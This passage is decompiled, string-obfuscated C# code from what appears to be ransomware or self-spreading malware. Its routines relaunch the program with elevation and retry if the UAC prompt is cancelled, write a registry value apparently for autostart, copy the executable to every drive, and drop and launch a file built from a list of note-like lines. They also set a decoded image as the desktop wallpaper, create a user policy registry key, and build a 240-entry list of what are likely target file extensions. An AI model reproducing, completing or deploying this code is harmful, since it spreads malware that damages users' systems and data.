		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(Convert.ToInt32("1", 2));
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				TypeLoadException(string_0);
			}
		}
	}

	private static void CallConvStdcall()
	{
		string folderPath = Environment.GetFolderPath((Environment.SpecialFolder)Convert.ToInt32("111", 2));
		string processName = Process.GetCurrentProcess().ProcessName;
		string string_ = "⭺";
		_003CModule_003E.smethod_0(ref string_, new object[4] { 780, "ទĳ8\f\u0006", 857, 2995 });
		string text = string_;
		string string_2 = "\uaa2eꩵꩲꩬ";
		_003CModule_003E.smethod_0(ref string_2, new object[5] { 'இ', 2390, 11859, 22695, 3625 });
		using StreamWriter streamWriter = new StreamWriter(folderPath + text + processName + string_2);
		string location = Assembly.GetExecutingAssembly().Location;
		string string_3 = "ﲲﲠﲇﲝﲌﲛﲇﲌﲝﲺﲁﲆﲛﲝﲊﲜﲝﲴ";
		_003CModule_003E.smethod_0(ref string_3, new object[2] { "㴚܅ޤW\u0016\u0003\a", 45231 });
		streamWriter.WriteLine(string_3);
		string string_4 = "傸傿傡僐傋傄傁傈僗僂僂僂";
		_003CModule_003E.smethod_0(ref string_4, new object[5] { false, "\u0822ɸP\u0005¿\0\u0004", 5879, 10384, 1460 });
		streamWriter.WriteLine(string_4 + location);
		string string_5 = "뒟뒵뒹뒸뒟뒸뒲뒳뒮듫듦";
		_003CModule_003E.smethod_0(ref string_5, new object[2] { 18174, 28120 });
		streamWriter.WriteLine(string_5);
		string text2 = location.Replace('\\', '/');
		string string_6 = "⺰\u2e9a⺖⺗⺿⺐⺕⺜⻄";
		_003CModule_003E.smethod_0(ref string_6, new object[5] { 4889, 2009, 'ኛ', 309, 55 });
		streamWriter.WriteLine(string_6 + text2);
	}

	private static void GetAllFuncCustData()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string string_ = "鎽";
		_003CModule_003E.smethod_0(ref string_, new object[6] { 2827, 'ɶ', false, 7519, 13936, 12945 });
		string text = folderPath + string_ + Ldflda;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, Era);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool Tasks()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string string_ = "ᮗ";
		_003CModule_003E.smethod_0(ref string_, new object[5] { 589, 'Ԣ', 'ᅒ', 'Ü', 558 });
		string text = folderPath + string_ + POSIX_FADV_DONTNEED;
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string string_2 = "캰";
		_003CModule_003E.smethod_0(ref string_2, new object[3] { 17862, 3447, '箯' });
		string path = folderPath2 + string_2 + Ldflda;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void W()
	{
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			string string_ = "≛≇≎≜≟≉≚≍≔≅≡≫≺≧≻≧≮≼≔≟≡≦≬≧≿≻≔≋≽≺≺≭≦≼≞≭≺≻≡≧≦≔≚≽≦";
			_003CModule_003E.smethod_0(ref string_, new object[2] { 7807, "\u007f\u030a" });
			RegistryKey registryKey = currentUser.OpenSubKey(string_, writable: true);
			string string_2 = "睊睮睤睵睨睴睨睡睳眧睔睳睨睵睢";
			_003CModule_003E.smethod_0(ref string_2, new object[5] { 568, "\u0018( \u0005\v", 'അ', 8166, "߉⑵টӅȀ\u0ad2" });
			registryKey.SetValue(string_2, Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void InterfaceType(string string_0)
	{
		char[] array = new char[1] { '\u0001' };
		DriveInfo[] drives = DriveInfo.GetDrives();
		for (int i = 0; i < drives.Length; i += array[0])
		{
			DriveInfo driveInfo = drives[i];
			string text = driveInfo.ToString();
			string string_ = "毯殖毰";
			_003CModule_003E.smethod_0(ref string_, new object[5] { 994, "Ņ\u0001;\a\u0003", "௶ࢯ", '3', 20839 });
			if (text != string_ && !File.Exists(driveInfo.ToString() + string_0))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + string_0);
				}
				catch
				{
				}
			}
		}
	}

	private static void ReadDecimal()
	{
		string string_ = "崟崚崚崈崍崄崀崇嵉崍崌崅崌崝崌嵉崚崁崈崍崆崞崚嵉嵆崈崅崅嵉嵆崘崜崀崌崝嵉嵏嵉崞崄崀崊嵉崚崁崈崍崆崞崊崆崙崐嵉崍崌崅崌崝崌";
		_003CModule_003E.smethod_0(ref string_, new object[4] { 125, "ੲ\u02ff", 3, 20344 });
		Wait.TypeResolve -= string_;
	}

	private static void EnumInfo()
	{
		string string_ = "绔绕绒结绒统绂纖纙绅结绂纖绍绒结绐绗练绚绂绋纖绔给给绂绅绂绗绂练绅细给绚统绕经纖统绑绘给组结绗绚绚绐绗统绚练组结绅纖纐纖绔绕绒结绒统绂纖纙绅结绂纖绍绒结绐绗练绚绂绋纖组结绕给绀结组经结绘绗绔绚结绒纖绘给";
		_003CModule_003E.smethod_0(ref string_, new object[3] { false, 7014, 25424 });
		Wait.TypeResolve -= string_;
	}

	private static void TimeZoneDisplayNameType()
	{
		string string_ = "ﰍﰘﰛﰞﰗﰓﰔﱚﰞﰟﰖﰟﰎﰟﱚﰙﰛﰎﰛﰖﰕﰝﱚﱗﰋﰏﰓﰟﰎ";
		_003CModule_003E.smethod_0(ref string_, new object[3] { 48725, false, 15909 });
		Wait.TypeResolve -= string_;
	}

	public static void AddScalar()
	{
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			string string_ = "䦗䦫䦢䦰䦳䦥䦶䦡䦘䦉䦭䦧䦶䦫䦷䦫䦢䦰䦘䦓䦭䦪䦠䦫䦳䦷䦘䦇䦱䦶䦶䦡䦪䦰䦒䦡䦶䦷䦭䦫䦪䦘䦔䦫䦨䦭䦧䦭䦡䦷䦘䦗䦽䦷䦰䦡䦩";
			_003CModule_003E.smethod_0(ref string_, new object[4] { 9549, 881, 138, '⁼' });
			RegistryKey registryKey = currentUser.CreateSubKey(string_);
			string string_2 = "☜☱☫☹☺☴☽☌☹☫☳☕☿☪";
			_003CModule_003E.smethod_0(ref string_2, new object[6] { 7738, 27, 42, 785, 1224, false });
			string name = string_2;
			string string_3 = "鿷";
			_003CModule_003E.smethod_0(ref string_3, new object[2] { "䞙።፵", 'ㅖ' });
			registryKey.SetValue(name, string_3);
			registryKey.Close();
		}
		catch
		{
		}
	}

	public static void SubtractRoundedHighNarrowingLower(string string_0)
	{
		if (string_0 != "")
		{
			try
			{
				string tempPath = Path.GetTempPath();
				string columnNumber = GetColumnNumber(Convert.ToInt32("9", 16));
				string string_ = "셭섩섳설";
				_003CModule_003E.smethod_0(ref string_, new object[3] { 16113, '艒', false });
				string text = tempPath + columnNumber + string_;
				File.WriteAllBytes(text, Convert.FromBase64String(string_0));
				SystemParametersInfo(20u, (uint)get_MaxValue, text, (uint)Convert.ToInt32("11", 2));
			}
			catch
			{
			}
		}
	}

	[CompilerGenerated]
	private static void Critical()
	{
		Callbacks();
	}

	[CompilerGenerated]
	private static void get_ReferenceValue()
	{
		Callbacks();
	}

	static Wait()
	{
		char[] array = new char[5] { '\u0001', 'P', 'j', '¾', 'á' };
		int[] array2 = new int[10] { 1, 0, 13, 21, 30, 89, 133, 137, 138, 173 };
		GetElementType = new byte[32];
		BitDecrement = Environment.UserName;
		string string_ = "겇곾겘겑겷겡겶겷겘";
		_003CModule_003E.smethod_0(ref string_, new object[6] { false, '×', "渦ᚐɤ", 363, 930, 'ῆ' });
		ThreadPriority = string_;
		string string_2 = "\uec0d\uec01\uec4b\uec48\uec53\uec4f\uec50\uec40\uec0f\uec5d\uec41\uec5b\uec0e\uec48\uec0b\uec54\uec55\uec59\uec5e\uec0c\uec0f\uec0a";
		_003CModule_003E.smethod_0(ref string_2, new object[6] { false, 289, '렁', 65, 5878, 7135 });
		get_Enabled = string_2;
		GenericMethodInfo = true;
		PARAMFLAG_FHASCUSTDATA = "";
		GenericTypeArguments = true;
		string string_3 = "저젷젱젽젤젷젠젫졼젷젪젷";
		_003CModule_003E.smethod_0(ref string_3, new object[4] { 2815, "\u03033ą\v\u001f\f\u0013", '䨐', '溿' });
		FormatStubInfo = string_3;
		__c__DisplayClass0_4 = (byte)array[0] != 0;
		string string_4 = "\u098dঈঝখ\u0991\u098dঊ\u09d0ছআছ";
		_003CModule_003E.smethod_0(ref string_4, new object[3] { 'ट', 'z', 'e' });
		POSIX_FADV_DONTNEED = string_4;
		string string_5 = "髴骉髎骉髁骍髟髉骏骍骉髈髑髨髿髿髰髶髋";
		_003CModule_003E.smethod_0(ref string_5, new object[2] { 31627, "πá\u0eb9\u0bd3" });
		TYPEFLAG_FCONTROL = string_5;
		sb = (byte)array2[0] != 0;
		ThreadTransferSendObj = false;
		GetILGenerator = Marshal.SizeOf(typeof(GetEncoding));
		string string_6 = "䰙䱘䱛䱉䱟䰌䰎䱳䱗䱛䱝䱟";
		_003CModule_003E.smethod_0(ref string_6, new object[6] { 55, "ɕ`", false, 2505, 6263, '✎' });
		Extended_Pictograph = string_6;
		string string_7 = "\udc15\udc55\udc4a\udc11\udc47\udc49\udc4e\udc4f\udc4e\udc51\udc14\udc17\udc4c\udc10\udc1d\udc49\udc48\udc12";
		_003CModule_003E.smethod_0(ref string_7, new object[5] { "ЫU\u0088\u000e\u000e", 877, 70, 'ಞ', "삨؇" });
		MutexIndex = string_7;
		string string_8 = "ⷋ\u2dfc\u2df8\u2dfdⷆⷔ\u2dfcⷆⶨ\u2dea\u2ded\u2db7\u2ded\u2de1\u2ded";
		_003CModule_003E.smethod_0(ref string_8, new object[4] { 226, 'ǌ', "᭘E॥ˏ\aʜ", 'w' });
		Ldflda = string_8;
		ReadUInt32 = false;
		EPROTOTYPE = false;
		NativeOverlapped = false;
		EINVAL = (byte)array2[1] != 0;
		U2 = false;
		string string_9 = "گ\u06ddۻۻگۏەۯڪڨ۳\u06e7۷ےۈ";
		_003CModule_003E.smethod_0(ref string_9, new object[5] { 1337, '\r', "\b\a\u0002\0\u0002", 249, 76 });
		IsFinal = string_9;
		CompareNotLessThan = IsFinal + TYPEFLAG_FCONTROL;
		string string_10 = "\ued84\ued85";
		_003CModule_003E.smethod_0(ref string_10, new object[4] { 8253, 2410, 'ᄀ', 45887 });
		IsSurrogatePair = string_10;
		AbandonedMutexException = IsSurrogatePair + MutexIndex + get_Enabled;
		string string_11 = "㜺㜭㜨㝉㜣㜡㝏㝩㜣㝯㝉㝳㜿㝹㝿㜿㝨㝓㜿㝚㝘㜿㝜㝂㜿㝈㜣㜿㜫㝏㝩㜠㜤㜾㜡㜡㝯㝮㝰㝱㜣㝉㝳㜿㝨㜢㜿㜫㝏㝩㜡㜫㜾㜧㜫㝯㜻";
		_003CModule_003E.smethod_0(ref string_11, new object[5] { 1803, "\v9", '7', 1422, 10750 });
		PreserveSigAttribute = new Regex(string_11);
		List<string> list = new List<string>();
		string string_12 = "諃諎諎誢諛諍諗諐誢諄請諎談諑誢諃諐談誢諎諍諁諉談諆";
		_003CModule_003E.smethod_0(ref string_12, new object[3] { 9012, false, 26446 });
		list.Add(string_12);
		list.Add("");
		string string_13 = "퐙퐵퐿퐱푴퐵푴퐤퐵퐭퐹퐱퐺퐠푴퐻퐲푴푥푸푤푤푤푴퐁퐇퐐푴퐽퐺푴퐖퐽퐠퐷퐻퐽퐺퐧푴푼퐪푴푤푺푤푦푦푴퐖퐀퐗푽푺푴퐗퐻퐺퐠퐵퐷퐠푴퐆퐱퐧퐠퐻퐦퐱퐒퐽퐸퐱퐧퐔퐰퐺퐹퐬푺퐻퐦퐳푴퐠퐻푴퐳퐱퐠푴퐠퐼퐱푴퐤퐵퐭퐹퐱퐺퐠푴퐵퐰퐰퐦퐱퐧퐧푴퐵퐺퐰푴퐡퐺퐸퐻퐷퐿푴퐲퐽퐸퐱퐧푺";
		_003CModule_003E.smethod_0(ref string_13, new object[3] { "ੴô\u0093õІJÚ", 35761, '㚉' });
		list.Add(string_13);
		list.Add("");
		string string_14 = "焴焖焙煗焄焒焙焓煗煆煗焙焘焙煚焞焚焇焘焅焃焖焙焃煗焓焘焔焂焚焒焙焃煗焙焘煗焛焖焅焐焒焅煗焃焟焖焙煗煅煂煇焼焵煗焃焘煗焂焙焛焘焔焜煗焑焘焅煗焑焅焒焒煙";
		_003CModule_003E.smethod_0(ref string_14, new object[4] { 124, 10271, 16110, 2542 });
		list.Add(string_14);
		list.Add("");
		string string_15 = "綼綋綀綏綃綇綀綉緎綁綜緎綃綁綊綇綈綗綇綀綉緎綂綁綍綅綋綊緎綈綇綂綋綝緎綃綏綗緎綜綋綝綛綂続緎綇綀緎綊綏続綏緎綂綁綝綝緀緎綻綝綇綀綉緎緝綜綊緎綞綏綜続綗緎綝綁綈続継綏綜綋緎綁綜緎綝綋綜綘綇綍綋綝緎綃綏綗緎綜綋綝綛綂続緎綇綀緎綊綏続綏緎綂綁綝綝緀";
		_003CModule_003E.smethod_0(ref string_15, new object[3] { 9299, false, 22939 });
		list.Add(string_15);
		list.Add("");
		string string_16 = "\ua7d7ꟸꞾ\ua7f0\ua7f1Ꞿ\ua7eeꟿ\ua7e7\ua7f3ꟻ\ua7f0\ua7eaꞾꟷ\ua7edꞾ\ua7ecꟻꟽꟻꟷ\ua7e8ꟻꟺꞾꟷ\ua7f0ꞾꞪꞦꞾꟶ\ua7f1\ua7eb\ua7ec\ua7edꞾꟿ\ua7f2\ua7f2Ꞿꟸꟷ\ua7f2ꟻ\ua7edꞾ\ua7e9ꟷ\ua7f2\ua7f2ꞾꟼꟻꞾ\ua7f2ꟻꟿꟵꟻꟺꞾ\ua7f1\ua7f0\ua7f2ꟷ\ua7f0ꟻꞰꞾ\ua7dfꟸ\ua7eaꟻ\ua7ecꞾꞩꞾꟺꟿ\ua7e7\ua7edꞾꟸꟷ\ua7f2ꟻ\ua7edꞾ\ua7e9ꟷ\ua7f2\ua7f2ꞾꟼꟻꞾ\ua7eb\ua7f0\ua7ecꟻꟽ\ua7f1\ua7e8ꟻ\ua7ecꟿꟼ\ua7f2ꟻꞰ";
		_003CModule_003E.smethod_0(ref string_16, new object[4] { 27822, '۵', '⚺', 3393 });
		list.Add(string_16);
		list.Add("");
		string string_17 = "胸胚胋肟能胖胋胜胐胖胑肅";
		_003CModule_003E.smethod_0(ref string_17, new object[3] { 3895, 21023, "ᬅɗpƝ" });
		list.Add(string_17);
		string string_18 = "盘盄盄盀盃皊皟皟盇盇盇皞盒盅盉盒盙盄盓盟盙盞盇盟盂盜盔盇盙盔盕皞盓盟盝皟";
		_003CModule_003E.smethod_0(ref string_18, new object[4] { false, "èḝ", '䎁', 5162 });
		list.Add(string_18);
		string string_19 = "똹똥똥똡똢뙫뙾뙾똳똸똥똲똾똸똿뙿똾똣똶뙾똴똿뙾똳똤똨";
		_003CModule_003E.smethod_0(ref string_19, new object[5] { "Ą\u009f", "ចቖƷɺ", "ॾ\u0dde\u065bॼ$<-", "ⷘࣇᛐ\u001f࠴", "ۓÓÂ\u00b8" });
		list.Add(string_19);
		string string_20 = "\udae8\udaf4\udaf4\udaf0\udaf3\udaba\udaaf\udaaf\udaf0\udae1\udaf8\udae6\udaf5\udaec\udaae\udae3\udaef\udaed\udaaf";
		_003CModule_003E.smethod_0(ref string_20, new object[4] { "剫ۂٽշ\u0354", "᱿\u0cf8\u0894ɼޘ", 9962, "pߑ\u05cct\u0081" });
		list.Add(string_20);
		string string_21 = "ࡗࡋࡋࡏࡌࠅࠐࠐࡓࡐ\u085c࡞ࡓ\u085dࡖࡋ\u085cࡐࡖࡑࡌࠑ\u085cࡐࡒࠐ";
		_003CModule_003E.smethod_0(ref string_21, new object[4] { 1384, "ĚƁ", false, 60 });
		list.Add(string_21);
		string string_22 = "ʁʝʝʙʚ\u02d3ˆˆʋʀʝʘʜʀʊʂˇʊʆˆ";
		_003CModule_003E.smethod_0(ref string_22, new object[3] { 196, 354, "¾\u0005" });
		list.Add(string_22);
		string string_23 = "ᔶᔪᔪᔮᔭᕤᕱᕱᔲᔷᔼᔻᔬᔪᔧᔦᕰᔽᔱᔳᕱ";
		_003CModule_003E.smethod_0(ref string_23, new object[6] { 4434, '\u0368', 'S', "\"\v\u0001\u0002\u0003", false, 30 });
		list.Add(string_23);
		string string_24 = "ꇭꇱꇱꇵꇶꆿꆪꆪꇧꇬꇱꇦꇪꇬꇫꆫꇪꇷꇢꆪꇠꇫꆪꇠꇽꇦꇭꇤꇫꇢꇠꇶ";
		_003CModule_003E.smethod_0(ref string_24, new object[3] { "ڊЖ\u038d\u0004ې\u036eֆ", 161, 33519 });
		list.Add(string_24);
		string string_25 = "\uf05c\uf040\uf040\uf044\uf047\uf00e\uf01b\uf01b\uf043\uf043\uf043\uf01a\uf057\uf05b\uf05d\uf05a\uf050\uf051\uf047\uf05f\uf01a\uf057\uf05b\uf059\uf01b\uf056\uf05d\uf040\uf057\uf05b\uf05d\uf05a\uf019\uf075\uf060\uf079\uf019\uf079\uf055\uf044";
		_003CModule_003E.smethod_0(ref string_25, new object[6] { 30403, "ӫ䪫ӰŔvP", 2050, 1092, false, 'ᚋ' });
		list.Add(string_25);
		string string_26 = "ɑɍɍɉɊȃȖȖɛɐɍɚɖɐɗɘɍɔɔɘɉȗɚɖɔȖ";
		_003CModule_003E.smethod_0(ref string_26, new object[5] { '\u0004', "\0\0\0\0\u0002", '2', 'Ȁ', true });
		list.Add(string_26);
		string string_27 = "\u0bc6\u0bda\u0bda\u0bde\u0bddஔ\u0b81\u0b81\u0bcd\u0bc1\u0bc7\u0bc0\u0bcf\u0bda\u0bc3\u0bdc\u0bcf\u0bca\u0bcf\u0bdc\u0b80\u0bcd\u0bc1\u0bc3\u0b81";
		_003CModule_003E.smethod_0(ref string_27, new object[3] { 'ʔ', false, 2330 });
		list.Add(string_27);
		string string_28 = "㷁㷝㷝㷙㷚㶓㶆㶆㷊㷆㷀㷇㷄㷈㷙㶇㷆㷛㷎㶆";
		_003CModule_003E.smethod_0(ref string_28, new object[3] { 11470, false, 'მ' });
		list.Add(string_28);
		Era = list;
		string[] array3 = new string[Convert.ToInt32("11110000", 2)];
		string string_29 = "ݥ\u073f\u0733\u073f";
		_003CModule_003E.smethod_0(ref string_29, new object[6] { 3, "Ľ\u0087\b\u000e5\0\a", 780, false, 548, 2 });
		array3[0] = string_29;
		string string_30 = "枠柤柯柼";
		_003CModule_003E.smethod_0(ref string_30, new object[3] { false, "ğ/EC", '斸' });
		array3[1] = string_30;
		string string_31 = "縺繰繵繠";
		_003CModule_003E.smethod_0(ref string_31, new object[3] { 24709, false, 7567 });
		array3[2] = string_31;
		string string_32 = "\uf336\uf37b\uf377\uf376\uf36c\uf379\uf37b\uf36c";
		_003CModule_003E.smethod_0(ref string_32, new object[6] { 2658, "\u0310\u0002Ğ", '⊀', '茔', 16114, false });
		array3[3] = string_32;
		string string_33 = "敪攷攡攰攰攭攪攣攷";
		_003CModule_003E.smethod_0(ref string_33, new object[4] { 24492, false, "Ŏ³", "ɗº\u001bd\u0001\u0002\u0004" });
		array3[4] = string_33;
		string string_34 = "邃郉郂郎";
		_003CModule_003E.smethod_0(ref string_34, new object[6] { false, 10842, false, "હ०ᎧඟV\u001a", 12345, 69 });
		array3[5] = string_34;
		int num = Convert.ToInt32("110", 2);
		string string_35 = "ប\u17de៕៙\u17c2";
		_003CModule_003E.smethod_0(ref string_35, new object[4] { 2785, 'ࡋ', false, 1166 });
		array3[num] = string_35;
		string string_36 = "땎딘딌딓";
		_003CModule_003E.smethod_0(ref string_36, new object[3] { false, "\u1086Ǩ", 41714 });
		array3[7] = string_36;
		string string_37 = "厥右叧司右";
		_003CModule_003E.smethod_0(ref string_37, new object[5] { 425, 'ᓁ', false, 9842, 5807 });
		array3[8] = string_37;
		string string_38 = "뺑뻏뻏뻋";
		_003CModule_003E.smethod_0(ref string_38, new object[5] { 8051, 15757, 223, '\u0087', "估\u103dá\v" });
		array3[9] = string_38;
		int num2 = Convert.ToInt32("a", 16);
		string string_39 = "Ȥɺɺɾɲ";
		_003CModule_003E.smethod_0(ref string_39, new object[3] { 'Ň', 107, 88 });
		array3[num2] = string_39;
		string string_40 = "遧逦逭逽";
		_003CModule_003E.smethod_0(ref string_40, new object[4] { "ત㧡ǆȸʽӇ", false, 11361, 5089 });
		array3[11] = string_40;
		string string_41 = "硹砽砧砰";
		_003CModule_003E.smethod_0(ref string_41, new object[4] { false, 3689, 23794, 3324 });
		array3[12] = string_41;
		int num3 = array2[2];
		string string_42 = "긊깉깏깅";
		_003CModule_003E.smethod_0(ref string_42, new object[6] { 298, 926, '笩', 11590, 'í', false });
		array3[num3] = string_42;
		string string_43 = "㵬㴯㴪㴶㴯㴮";
		_003CModule_003E.smethod_0(ref string_43, new object[4] { 12241, 710, 1689, 'В' });
		array3[14] = string_43;
		int num4 = Marshal.SizeOf(typeof(Truncate));
		string string_44 = "\udd13\udd52\udd4c\udd44";
		_003CModule_003E.smethod_0(ref string_44, new object[6] { 55, '\u0088', 2163, 898, '킉', false });
		array3[num4] = string_44;
		string string_45 = "ᴩᵷᵩᵠ";
		_003CModule_003E.smethod_0(ref string_45, new object[2] { 7313, "5\t\u0017\u001a\u0003\u0004" });
		array3[16] = string_45;
		string string_46 = "\uebd8\ueb95\ueb85\ueb80";
		_003CModule_003E.smethod_0(ref string_46, new object[4] { 16985, 17221, 7268, "ẛḹও\u038d" });
		array3[17] = string_46;
		string string_47 = "ཏ༑\u0f18";
		_003CModule_003E.smethod_0(ref string_47, new object[5] { 1627, 'Ž', 396, 1421, 112 });
		array3[18] = string_47;
		string string_48 = "斝旀旂旟";
		_003CModule_003E.smethod_0(ref string_48, new object[5] { '㵲', false, 9141, "Ğǭű", 16 });
		array3[19] = string_48;
		string string_49 = "쓀쒃쒊쒌";
		_003CModule_003E.smethod_0(ref string_49, new object[3] { "űˉ6d\u0006\u0002", 14495, 34675 });
		array3[20] = string_49;
		int num5 = array2[3];
		string string_50 = "䥆䤘䤀䤘";
		_003CModule_003E.smethod_0(ref string_50, new object[4] { '䀌', "\u08d6f\0\t", 16, 7 });
		array3[num5] = string_50;
		string string_51 = "膕臚臈臋";
		_003CModule_003E.smethod_0(ref string_51, new object[4] { '㟁', "ቢ\u0011t\u001f", false, 14068 });
		array3[22] = string_51;
		string string_52 = "쩁쨎쨜쨟쨗";
		_003CModule_003E.smethod_0(ref string_52, new object[4] { "ᕊӵ", 12142, 'ݒ', "䤻ᛎਚӓʖߤ" });
		array3[23] = string_52;
		string string_53 = "ꒆ꓀ꓜ꓅꓄";
		_003CModule_003E.smethod_0(ref string_53, new object[4] { 35232, 1108, 'Խ', 4471 });
		array3[24] = string_53;
		int num6 = Marshal.SizeOf(typeof(NotSupported_StringComparison));
		string string_54 = "맜릚릆릟";
		_003CModule_003E.smethod_0(ref string_54, new object[6] { "Ђ\u009c\u0018ŊZ", 4938, "殃উሖ\u08e7", "Ñ_\t\r\u0002\n", 3827, false });
		array3[num6] = string_54;
		string string_55 = "ㆳ\u31e5ㇰㇱ";
		_003CModule_003E.smethod_0(ref string_55, new object[3] { "\u1311টھf{", 3406, false });
		array3[26] = string_55;
		string string_56 = "垈埖埕埂";
		_003CModule_003E.smethod_0(ref string_56, new object[6] { '▜', "ය\u05b3ƭ\u0016\u00a0Q#", 1456, 2868, "֊Ćϭ)\t3", false });
		array3[27] = string_56;
		string string_57 = "㺹㻧㻳㻱";
		_003CModule_003E.smethod_0(ref string_57, new object[5] { '⇒', 706, 'Ց', "Úυໞ'", 270 });
		array3[28] = string_57;
		string string_58 = "釥醳醧醪";
		_003CModule_003E.smethod_0(ref string_58, new object[5] { 10408, 'Ԕ', 1392, '\u0097', 24072 });
		array3[29] = string_58;
		int num7 = array2[4];
		string string_59 = "\ua879꠴ꠢ꠵";
		_003CModule_003E.smethod_0(ref string_59, new object[2] { 'ᜮ', 37161 });
		array3[num7] = string_59;
		string string_60 = "쀯쁥쁠쁤";
		_003CModule_003E.smethod_0(ref string_60, new object[3] { '鐉', 477, 10779 });
		array3[31] = string_60;
		string string_61 = "閙闞闙闓闓";
		_003CModule_003E.smethod_0(ref string_61, new object[5] { 1174, 28, 33536, 3092, "ǥ\u0004\u0001\u0003\u0004" });
		array3[32] = string_61;
		string string_62 = "㙉㘄㘔";
		_003CModule_003E.smethod_0(ref string_62, new object[4] { "ܥኧΞʝળ", 482, 'Ӈ', 1284 });
		array3[33] = string_62;
		string string_63 = "弁彂彟弜";
		_003CModule_003E.smethod_0(ref string_63, new object[2] { 5568, 18799 });
		array3[34] = string_63;
		int num8 = _003CModule_003E.ToUInt64[1];
		string string_64 = "뵒봑봌뵈";
		_003CModule_003E.smethod_0(ref string_64, new object[4] { 1554, 2520, 6870, 37564 });
		array3[num8] = string_64;
		string string_65 = "蘃虉虚虊";
		_003CModule_003E.smethod_0(ref string_65, new object[6] { 3852, 5067, "\u0bd5ފଞŵɝ", '⮐', false, 5495 });
		array3[36] = string_65;
		string string_66 = "ՓԇԔԍ";
		_003CModule_003E.smethod_0(ref string_66, new object[4] { 28, 8, 'Ѳ', 231 });
		array3[37] = string_66;
		string string_67 = "눽뉡뉲뉡";
		_003CModule_003E.smethod_0(ref string_67, new object[3] { "ѳવ", 17989, "ⱦᦃᚽ" });
		array3[38] = string_67;
		string string_68 = "眭睮睬睵";
		_003CModule_003E.smethod_0(ref string_68, new object[4] { 27078, 608, 341, 'ঈ' });
		array3[39] = string_68;
		string string_69 = "积禳禵禧";
		_003CModule_003E.smethod_0(ref string_69, new object[2] { 16241, '㩐' });
		array3[40] = string_69;
		string string_70 = "퓙풕풚풇";
		_003CModule_003E.smethod_0(ref string_70, new object[5] { '૮', "\u087d\u0345ă", "䂡䟙", 11427, "ݴ\u0081\u0012\u0003\u0005\u0013\u0005" });
		array3[41] = string_70;
		string string_71 = "릒맑맗맊";
		_003CModule_003E.smethod_0(ref string_71, new object[5] { false, 16531, 6665, 16663, "ჵభ\vbz" });
		array3[42] = string_71;
		string string_72 = "堖塙塎塑";
		_003CModule_003E.smethod_0(ref string_72, new object[6] { "\u087dňਝíࠒ", 'ಸ', "\u086eéƾ×\v", 'ྊ', false, 4894 });
		array3[43] = string_72;
		int num9 = Convert.ToInt32("54", 8);
		string string_73 = "ꊄꋋꋚꋁ";
		_003CModule_003E.smethod_0(ref string_73, new object[4] { '⦔', '瘂', false, 788 });
		array3[num9] = string_73;
		int key = Key;
		string string_74 = "Ⰸⱊⱈⱍ";
		_003CModule_003E.smethod_0(ref string_74, new object[3] { false, 4215, 7087 });
		array3[key] = string_74;
		string string_75 = "꼯꽥꽨꽣";
		_003CModule_003E.smethod_0(ref string_75, new object[4] { "\u0358\u0013\u0333", 8171, "敬ԙᣔƦȪ", 335 });
		array3[46] = string_75;
		string string_76 = "岵峿峲峸";
		_003CModule_003E.smethod_0(ref string_76, new object[6] { "≵\u0c64ѝ#p", 127, false, "[Ř\u0342\u001bğÚ<", 7815, 'ʇ' });
		array3[47] = string_76;
		string string_77 = "斥旯既旭";
		_003CModule_003E.smethod_0(ref string_77, new object[4] { '䐄', 1562, "ת\u0bc3", 2496 });
		array3[48] = string_77;
		string string_78 = "埑垛垖垉垇";
		_003CModule_003E.smethod_0(ref string_78, new object[5] { "ćҖώǨ\u0360", false, 'ɜ', 663, 17497 });
		array3[49] = string_78;
		string string_79 = "舊艍艗艋";
		_003CModule_003E.smethod_0(ref string_79, new object[4] { 652, "\u0b04ÎÓ\u008d\u02fdv", 'ᙐ', 22691 });
		array3[50] = string_79;
		string string_80 = "ꃡꃸꂵꂦꂿ";
		_003CModule_003E.smethod_0(ref string_80, new object[3] { false, 10864, 30303 });
		array3[51] = string_80;
		string string_81 = "ຘ໗໕໓";
		_003CModule_003E.smethod_0(ref string_81, new object[2] { 2698, 1068 });
		array3[52] = string_81;
		string string_82 = "粵糺糩糱";
		_003CModule_003E.smethod_0(ref string_82, new object[3] { 17225, 3991, "jṈЏʥѕ" });
		array3[53] = string_82;
		string string_83 = "닼늰늨닠";
		_003CModule_003E.smethod_0(ref string_83, new object[5] { '\u035f', false, "綞\u061a᭖", 2934, 1263 });
		array3[54] = string_83;
		string string_84 = "⏍⎀⎂⎁";
		_003CModule_003E.smethod_0(ref string_84, new object[3] { 272, 164, 8751 });
		array3[55] = string_84;
		string string_85 = "⎰⏹⏤⏷⏮";
		_003CModule_003E.smethod_0(ref string_85, new object[5] { 127, 6155, false, 'উ', 395 });
		array3[56] = string_85;
		string string_86 = "䬈䭊䭜䭎";
		_003CModule_003E.smethod_0(ref string_86, new object[3] { 6212, '\u1ae5', 6141 });
		array3[57] = string_86;
		string string_87 = "䉅䈟䈊䈙";
		_003CModule_003E.smethod_0(ref string_87, new object[5] { "፱᱕N", "{Җ", 2402, 903, 93 });
		array3[58] = string_87;
		int num10 = Convert.ToInt32("111011", 2);
		string string_88 = "浡津洿洪洨";
		_003CModule_003E.smethod_0(ref string_88, new object[4] { 22094, "^l\0\u0010", 909, "\u102cɮ" });
		array3[num10] = string_88;
		string string_89 = "줵쥣쥡";
		_003CModule_003E.smethod_0(ref string_89, new object[3] { 38472, 10953, 'ࠊ' });
		array3[60] = string_89;
		string string_90 = "Ⓠ⒅⒘⒍⒏";
		_003CModule_003E.smethod_0(ref string_90, new object[2] { 9195, 'ý' });
		array3[61] = string_90;
		string string_91 = "\uaafaꪠꪻꪦꪦꪱꪺꪠ";
		_003CModule_003E.smethod_0(ref string_91, new object[4] { '噇', 12690, 8955, false });
